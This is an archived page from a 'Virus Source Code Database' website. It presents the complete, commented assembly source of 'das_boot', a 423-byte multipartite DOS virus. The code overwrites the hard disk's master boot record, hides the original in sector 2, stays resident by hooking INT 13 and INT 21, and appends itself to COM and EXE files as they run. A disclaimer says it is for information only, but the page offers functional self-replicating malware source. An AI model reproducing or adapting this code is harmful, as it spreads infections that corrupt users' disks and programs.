<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: das_boot_asm</title>
<meta name="KEYWORDS" content="das_boot.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for das_boot.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center>
<p><b>
 A multipartite virus in just 423 bytes!
                   When loaded from an infected file, the virus
                   only infects MBR - it does not go resident,
                   neither it infects files.
                   When booted from an infected MBR, the virus
                   decrements 0:413 by 1, copies itself to the
                   top of memory and intercepts INT 13. INT 13
                   handler routine is used only to intercept INT 21
                   when DOS is loaded. From within INT 21 the virus
                   infects COM & EXE files being executed.
</b><p><textarea cols=90 rows=30>

;=============================================================================
; FILE:         das_boot.a86   
; DESCRIPTION:  _small virus modified into mulipartite COM/EXE infector
; THANKS TO:    Dark Angel of Phalcon/Skism
;=============================================================================

boot            equ     07b00     ;delta offset for boot-time location
com             equ     0100      ;delta offset for resident location
EXE_id          equ     -040      ;EXE infection tag
viruslength     equ     01a7      ;length of virus = 423 bytes

das_boot:                                                                       
        call    relative                                                        

oldheader       db      0CD, 020  ;*(00) EXE file signature     | COM file's
                dw      ?         ;*(02) # of bytes in last page| 1st 3 bytes
                dw      ?         ;*(04) size of file + header (pages)
                dw      ?         ; (06) # of relocation items
                dw      ?         ; (08) size of header (paragraphs)
                dw      ?         ; (0A) min paragraphs needed
                dw      ?         ; (0C) max paragraphs needed
                dw      ?         ;*(0E) ss displacement from entry in para.
                dw      ?         ;*(10) sp value at entry
                dw      ?         ; (12) checksum
                dw      ?         ;*(14) ip value at entry
                dw      ?         ;*(16) cs displacement from entry in para.
                                  ;* - indicates value modified by das_boot
relative:                                                                       
        pop     bp                      ;pop offset of oldheader off of stack
        sub     bp,03                   ;adjust offset to start of program
        mov     ax,cs                   ;load ax with current segment
        mov     cl,04                   ;load cx with multiplier/shift value 
        shl     ax,cl                   ;calculate absolute segment
        mov     si,bp                   ;load si with program offset
        add     si,ax                   ;calculate absolute address
        cmp     si,07c00                ;code executing at boot-time address?
        jne     infect_mbr              ;if not, must be executing from file,
                                        ;  so attempt to infect MBR
        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point ds to vector table

        push    si                      ;save 0000:07c00 on stack as load  
        push    ds                      ; location for original MBR

        dec     word ptr [0413]         ;decrease conventional memory by 1KB
        int     012                     ;load ax with #KB of conv. memory
        mov     cx,0106                 ;load move (100) and shift (06) values
        shl     ax,cl                   ;calculate destination segment

        mov     es,ax                   ;set es to destination segment
        mov     [022*4+2],ax            ;store boot tag in int22 vector seg.
        xchg    [013*4+2],ax            ;point int13 vector to virus segment
        mov     [offset old13+boot+2],ax ;store old int13 segment value
        mov     ax,offset int13-com     ;load ax with virus int13 handler off.
        xchg    [013*4],ax              ;point int13 vector to virus offset
        mov     [offset old13+boot],ax  ;store old int13 offset value
  
        xor     di,di                   ;set destination offset=0000
        cld                             ;clear direction flag (fwd)
        rep     movsw                   ;move virus to top of conv. memory

        push    es                      ;push destination segment for retf
        mov     ax,offset top_mem-com   ;load ax with offset
        push    ax                      ;push offset for retf
        retf                            ;return to self at new location
top_mem:
        pop     es                      ;pop es=0000 as disk load segment
        mov     ax,0201                 ;select read-one-sector function
        pop     bx                      ;pop bx=07c00 as disk load offset
        mov     cl,02                   ;cylinder 0, sector 2 (original MBR)
                                        ;head 0, drive "C"
        int     013                     ;load original MBR

        jmp     0000:07c00              ;jump to execute original MBR

infect_mbr:
        push    ds                      ;preserve registers
        push    es

        push    cs                      
        pop     ds                      ;set ds=cs
        push    cs
        pop     es                      ;set es=cs

        mov     ax,0201                 ;select read-one-sector function
        lea     bx,[bp+viruslength]     ;set load offset just beyond program
        mov     cx,01                   ;cylinder 0, sector 1 (MBR)
        mov     dx,080                  ;head 0, drive "C"
        int     013                     ;load MBR
        jb      exit_small              ;if flag=error, exit
                                        

        cmp     [bx],018e8              ;check for das_boot code
        je      exit_small              ;if equal, MBR already infected, so
                                        ; exit
        mov     ax,0301                 ;select write-one-sector function
        inc     cx                      ;cylinder 0, sector 2
        int     013                     ;relocate original MBR to sector 2

        mov     si,bp                   ;set source offset to start of virus
        mov     di,bx                   ;set dest. offset to MBR in buffer
        mov     cx,viruslength          ;load move count to cx
        rep     movsb                   ;move virus to MBR in memory

        mov     ax,0301                 ;select write-one-sector function
        inc     cx                      ;cylinder 0, sector 1 (MBR)
        int     013                     ;write infected MBR to drive "C"
exit_small:                                                                     
        pop     es                      ;restore segment registers to point     
        pop     ds                      ; to PSP                                

        add     bp,03                   ;reset bp to point to oldheader

        or      sp,sp                   ;test parity of stack pointer        
        jpo     returnCOM               ;if value is odd, COM file is host
returnEXE:                                                                      
        mov     ax,ds                   ;load ax with PSP segment
        add     ax,010                  ;adjust segment value to skip PSP
        add     [bp+016],ax             ;restore orig. cs value in oldheader
        add     ax,[bp+0e]              ;calculate original ss entry value   
        mov     ss,ax                   ;load ss with original value         
        mov     sp,cs:[bp+010]          ;load sp with program entry value
        jmp     dword ptr cs:[bp+014]   ;jump to EXE file entry point via
                                        ; restored value in oldheader
returnCOM:                                                                      
        mov     di,0100                 ;COM file entry point & move dest.
        push    di                      ;save on stack as return offset 
        mov     si,bp                   ;point to stored COM 1st three bytes
        movsw                           ;move the original three bytes
        movsb                           ; back to the start of the COM file
        ret                             ;return to execute the COM file
                                        ; (return segment already on stack)
int13:
        push    ax                      ;preserve registers
        push    ds

        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point ds to vector table

        push    cs
        pop     ax                      ;set ax=cs

        cmp     [090*4],ax              ;bypass flag set?
        je      exit_int13              ;if so, don't steal int21 vector again

        cmp     [022*4+2],ax            ;int22 vector segment = boot tag?
        je      exit_int13              ;if so, vectors not fully initialized,
                                        ; so don't steal int21 yet
        mov     [090*4],ax              ;put bypass flag in unused BASIC vect.

        mov     ax,offset int21-com     ;load ax with virus int21 handler off.
        xchg    [021*4],ax              ;point int21 vector to virus offset
        mov     cs:[offset old21-com],ax ;store orig. int21 handler offset
        mov     ax,cs                   ;load ax with virus int21 handler seg.
        xchg    [021*4+2],ax            ;point int21 vector to virus segment
        mov     cs:[offset old21-com+2],ax ;store orig. int21 handler segment
exit_int13:
        pop     ds                      ;restore registers
        pop     ax

        db      0ea                     ;"jmp far" to location specified in
old13:                                  ; old13
        dw      ?, ?                    ;offset and segment of original int13
                                        ; handler
infect:                                                                         
        push    ax                      ;preserve registers
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        mov     ax,03d02                ;open file read/write function
        int     021                     ;attempt to open file read/write
        xchg    ax,bx                   ;save file handle in bx                 

        push    cs                                                              
        pop     ds                      ;set ds=cs                              
        push    cs                                                              
        pop     es                      ;set es=cs                              

        mov     si,offset oldheader-com ;point to offset of oldheader

        mov     ah,03f                  ;read file function
        mov     cx,018                  ;first 18 bytes
        push    cx                      ;save value for later use        
        mov     dx,si                   ;point to oldheader offset
        int     021                     ;load file's 1st 18 bytes to oldheader

        cmp     ax,cx                   ;18 bytes successfully read?            
        jne     go_already_infected     ;if not, open file read/write failed,
                                        ; so exit         

        mov     di,offset target-com    ;point to target offset
        push    di                      ;save offset value for later use      
        rep     movsb                   ;move oldheader to target (cx=18)
        pop     di                      ;restore di to target offset value  

        mov     ax,04202                ;move file pointer, offset from EOF
        cwd                             ;set dx=0000 (LSP) [cx=0000 (MSP)]
        int     021                     ;move file pointer to EOF, dx:ax 
                                        ; returned as new file pointer
        cmp     ds:[di],'ZM'            ;check target header for EXE tag       
        je      infectEXE               ;if present, infect EXE                

infectCOM:
        sub     ax,03                   ;subtract 3 from file pointer offset
        mov     byte ptr ds:[di],0e9    ;put "jmp" at start of target header
        mov     ds:[di+01],ax           ;put jmp offset in target header

        sub     ax,viruslength          ;calc. jmp offset of infected file    
        cmp     ds:[si-017],ax          ;does file's jmp offset match?
        jne     finishinfect            ;if not, it's not infected, so infect  
go_already_infected:                                                            
        pop     cx                      ;discard excess value on stack          
        jmp     short already_infected  ;exit infection routine                 

int21:                                                                          
        cmp     ax,04b00                ;load and execute file request?
        je      infect                  ;if so, attempt to infect file
        jmp     short chain             ;if not, jump to orig. int21 handler    

infectEXE:                                                                      
        cmp     word ptr [di+010],EXE_id ;check for infect tag in target SP
        je      go_already_infected      ;if tag is present, don't infect       

        push    ax                      ;push file pointer LSP                  
        push    dx                      ;push file pointer MSP                  

        add     ax,viruslength          ;add virus length to file length (LSP)  
        adc     dx,0                    ;adjust MSP (segment) to reflect        
                                        ; any carry from adjustment of LSP
        mov     cx,0200                 ;set cx=1 page (512d bytes)
        div     cx                      ;divide new file length by 512d to      
                                        ; calculate number of pages in file
        or      dx,dx                   ;remainder in dx?                       
        jz      nohiccup                ;if not, no need to add another page
        inc     ax                      ;add another page to length value       
nohiccup:                                                                       
        mov     ds:[di+04],ax           ;store # of pages in target header
        mov     ds:[di+02],dx           ;store # of bytes in last page in
                                        ; target header
        pop     dx                      ;restore dx to file pointer MSP         
        pop     ax                      ;restore ax to file pointer LSP         

        mov     cx,010                  ;convert dx:ax to
        div     cx                      ; segment(ax):offset(dx) form

        sub     ax,ds:[di+08]           ;subtract header size

        mov     ds:[di+014],dx          ;store new entry ip in target
        mov     ds:[di+016],ax          ;store new entry cs displacement

        mov     ds:[di+0e],ax           ;store new entry ss displacement
        mov     word ptr ds:[di+010],EXE_id ;store EXE_id as sp in target
finishinfect:                                                                   
        mov     ah,040                  ;write to file w/handle function
        mov     cx,viruslength          ;specify # of bytes to write            
        xor     dx,dx                   ;set buffer start at virus offset    
        int     021                     ;write _small to EOF

        mov     ax,04200                ;move file pointer, offset from BOF
        xor     cx,cx                   ;MSP of offset cx=0000
        cwd                             ;LSP of offset dx=0000
        int     021                     ;move file pointer to BOF

        mov     ah,040                  ;write to file w/handle function
        mov     dx,di                   ;set buffer start at target header
        pop     cx                      ;specify 18 bytes to write              
        int     021                     ;write modified EXE header (or COM 
                                        ; jmp xxxx & next 15 bytes) to BOF
already_infected:                                                               
        mov     ah,03e                  ;close file w/handle function
        int     021                     ;close file
exitinfect:                                                                     
        pop     es                      ;preserve registers
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax

chain:                                                                          
                db      0ea     ;"jmp far" to location specified in old21
heap:                                                                           

old21           dw      ?, ?    ;offset and segment of orig. int21 handler

target          dw      ?       ;*(00) EXE file signature     | COM file's
                dw      ?       ;*(02) # of bytes in last page| jmp to virus
                dw      ?       ;*(04) size of file + header (pages)       
                dw      ?       ; (06) # of relocation items               
                dw      ?       ; (08) size of header (paragraphs)         
                dw      ?       ; (0A) min paragraphs needed               
                dw      ?       ; (0C) max paragraphs needed               
                dw      ?       ;*(0E) ss displacement from entry in para. 
                dw      ?       ;*(10) sp value at entry                   
                dw      ?       ; (12) checksum                            
                dw      ?       ;*(14) ip value at entry                   
                dw      ?       ;*(16) cs displacement from entry in para. 
                                ;* - indicates value modified by das_boot  
endheap:                                                                        

        end     das_boot        


</textarea></td></tr></table></body></html>
